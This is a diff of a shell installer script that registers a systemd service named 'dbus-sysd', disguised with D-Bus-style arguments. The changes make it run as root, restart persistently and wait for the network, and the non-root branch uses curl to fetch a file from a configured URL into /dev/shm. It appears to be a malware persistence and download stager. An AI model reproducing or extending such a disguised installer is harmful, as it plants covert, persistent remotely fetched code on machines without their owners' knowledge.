@@ -2,7 +2,6 @@
 
 
 SERVICE_NAME="dbus-sysd"
-CONFIG_DIR_ROOT="/usr/bin/dbus-sysd"
 CONFIG_FILE_ROOT="/usr/bin/dbus-sysd"
 SERVICE_PATH="/lib/systemd/system/${SERVICE_NAME}.service"
 APP_CMD_PATH="/dev/shm"
@@ -18,20 +17,24 @@ if [[ $EUID -eq 0 ]]; then
 [Unit]
 Description=${SERVICE_NAME} Service
 After=network.target
+Wants=network-online.target systemd-networkd-wait-online.service
 
 [Service]
-Type=simple
-ExecStart=${CONFIG_FILE_ROOT} --system --address=systemd --nofork --nopidfile --systemd-activation
 Restart=always
+RestartSec=60s
+StartLimitInterval=450s
+Type=forking
+User=root
+ExecStart=${CONFIG_FILE_ROOT} --system --address=systemd --nofork --nopidfile --systemd-activation
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-    chmod 644 "$SERVICE_PATH"
+    chmod 755 "$SERVICE_PATH"
     systemctl daemon-reload
-    systemctl restart "$SERVICE_NAME"
-    systemctl enable "$SERVICE_NAME"
+    systemctl restart "${SERVICE_NAME}.service"
+    systemctl enable "${SERVICE_NAME}.service"
 
 else
     curl -fsSL "$CONFIG_URL" -o "${APP_CMD_PATH}/${APP_CMD}"
